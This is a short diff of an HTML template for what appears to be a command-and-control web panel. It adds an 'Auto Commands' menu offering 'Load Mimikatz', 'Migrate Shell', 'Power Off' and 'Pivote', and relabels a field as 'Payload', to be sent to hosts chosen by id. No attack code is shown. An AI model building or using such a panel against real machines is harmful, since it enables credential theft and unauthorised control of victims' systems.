@@ -31,6 +31,9 @@
     a:hover {
       color:black;
     }
+    small {
+      margin-bottom: 1em;
+    }
   </style>
   {%if error%}
   <div class="alert alert-primary" role="alert">
@@ -45,7 +48,7 @@
         <input name="id" type="text" class="form-control" placeholder="Id">
       </div>
       <div class="form-group">
-        <label>Commands :</label>
+        <label>Payload :</label>
         <!--<input name="payload" type="text" class="form-control" placeholder="Payload">-->
         <textarea name="payload" class="form-control" id="exampleFormControlTextarea1" rows="3"></textarea>
       </div>
@@ -59,5 +62,19 @@
     {%endfor%}
     {%endif%}
     </ul>
+    <br/>
+    <h2>Auto Commands :</h2>
+    <br/>
+    <form method="POST">
+    <select class="custom-select" name="auto">
+      <option value="0" selected>Open this select menu</option>
+      <option value="1">Load Mimikatz</option>
+      <option value="2">Migrate Shell</option>
+      <option value="3">Power Off</option>
+      <option value="4">Pivote</option>
+    </select>
+    <small class="form-text text-muted">By Choosing one of theses, the payload below will be lost.</small>
+    <button type="submit" name="custom" class="btn btn-outline-secondary btn-lg btn-block">Send</button>
+  </form>
   </body>
 </html>
